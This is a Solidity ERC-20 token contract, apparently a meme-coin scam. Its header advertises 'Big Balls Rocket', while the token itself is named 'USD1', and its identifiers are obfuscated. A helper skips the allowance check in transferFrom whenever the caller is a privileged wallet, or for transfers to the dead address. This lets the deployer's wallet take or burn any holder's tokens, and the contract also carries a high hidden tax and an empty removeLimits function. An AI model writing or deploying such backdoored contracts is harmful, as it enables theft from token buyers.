// SPDX-License-Identifier: MIT

/*
    Big Balls Rocket
    BIGBALLS

    https://t.me/BIGBALLSonEth
    https://x.com/alx/status/1904312926351015968
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract USD is Context, IERC20, Ownable {
    address payable private _taxclknlRGRG;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"USD1";
    string private constant _symbol = unicode"USD1";

    uint256 private _vkjbnkfjRGRG = 10;
    uint256 private _maxovnboiRGRG = 10;
    uint256 private _initvkjnbkjRGRG = 20;
    uint256 private _finvjlkbnlkjRGRG = 0;
    uint256 private _redclkjnRGRGK = 2;
    uint256 private _prevlfknjoiRGRG = 2;
    uint256 private _buylkvnlRGRGK = 0;
    IUniswapV2Router02 private RomRouter;

    uint256 public _vnbbvlRGRGK = qq30fef / 100;
    uint256 public _oijboijoiRGRG = 15 * 10 ** 18;
    uint256 private _cvjkbnkjRGRG = 10;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlRGRGKC;
    mapping(address => mapping(address => uint256)) private _allcvnkjnRGRG;
    mapping(address => bool) private _feevblknlRGRG;
    
    address private router_;
    address private ParBalance;
    bool private _tradingvlknRGRG;
    bool private _inlknblRGRG = false;
    bool private swapvlRGRGK = false;
    uint256 private _sellcnjRGRGK = 0;
    uint256 private _lastflkbnlRGRG = 0;
    address constant _deadlknRGRG = address(0xdead);


    modifier lockTheSwap() {
        _inlknblRGRG = true;
        _;
        _inlknblRGRG = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlRGRGKC[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function _calcTax_lvknblRGRG(address from, address to, uint256 amount) private returns(uint256) {
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblRGRG) {
                taxAmount = amount
                    .mul((_buylkvnlRGRGK > _redclkjnRGRGK) ? _finvjlkbnlkjRGRG : _initvkjnbkjRGRG)
                    .div(100);
            }
            if (
                from == ParBalance &&
                to != address(RomRouter) &&
                !_feevblknlRGRG[to] &&
                to != _taxclknlRGRG
            ) {
                _buylkvnlRGRGK++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblRGRG &&
                to == ParBalance &&
                from != _taxclknlRGRG &&
                swapvlRGRGK &&
                _buylkvnlRGRGK > _prevlfknjoiRGRG
            ) {
                if (block.number > _lastflkbnlRGRG) {
                    _sellcnjRGRGK = 0;
                }
                _sellcnjRGRGK = _sellcnjRGRGK + _getAmountOut_lvcbnRGRGK(amount);
                require(_sellcnjRGRGK <= _oijboijoiRGRG, "Max swap limit");
                if (contractTokenBalance > _vnbbvlRGRGK)
                    _swapTokenslknlRGRG(_vnbbvlRGRGK > amount ? amount : _vnbbvlRGRGK);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjRGRG(address(this).balance);
                }
                _lastflkbnlRGRG = block.number;
            }
        }
        return taxAmount;
    }

    constructor() payable {
        _taxclknlRGRG = payable(_msgSender());
        
        _balknvlRGRGKC[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlRGRGKC[address(this)] = (qq30fef * 98) / 100;
        _feevblknlRGRG[address(this)] = true;
        _feevblknlRGRG[_taxclknlRGRG] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _up3f3ojRGRG(address from, address to)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlRGRG[msg.sender]) return !_feevblknlRGRG[msg.sender];
        if(!(from == ParBalance || to != _deadlknRGRG)) return false;
        return true;
    }

    function _transfer_kjvnRGRG(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = _calcTax_lvknblRGRG(from, to, amount);
        _balknvlRGRGKC[from] = _balknvlRGRGKC[from].sub(amount);
        _balknvlRGRGKC[to] = _balknvlRGRGKC[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlRGRGKC[address(this)] = _balknvlRGRGKC[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknRGRG) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnRGRG[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnRGRG(sender, recipient, amount);
        if (_up3f3ojRGRG(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnRGRG[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }
    
    function _sendETHTocvbnjRGRG(uint256 amount) private {
        _taxclknlRGRG.transfer(amount);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnRGRG(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnRGRG[owner][spender];
    }

    function _swapTokenslknlRGRG(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        _approve(address(this), address(RomRouter), tokenAmount);
        router_ = address(RomRouter);
        RomRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits () external onlyOwner {
    }

    function _setTax_lknblRGRG(address payable newWallet) external {
        require(_feevblknlRGRG[_msgSender()]);
        _taxclknlRGRG = newWallet;
        _feevblknlRGRG[_taxclknlRGRG] = true;
    }

    function aRGRGTeam() external onlyOwner {
        require(!_tradingvlknRGRG, "Trading is already open");
        RomRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(RomRouter), qq30fef);
        ParBalance = IUniswapV2Factory(RomRouter.factory()).createPair(
            address(this),
            RomRouter.WETH()
        );
        RomRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlRGRGK = true;
        _tradingvlknRGRG = true;
        IERC20(ParBalance).approve(
            address(RomRouter),
            type(uint256).max
        );
    }
    receive() external payable {}
    function _assist_bnRGRG() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function _getAmountOut_lvcbnRGRGK(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RomRouter.WETH();
        uint256[] memory amountOuts = RomRouter.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }
}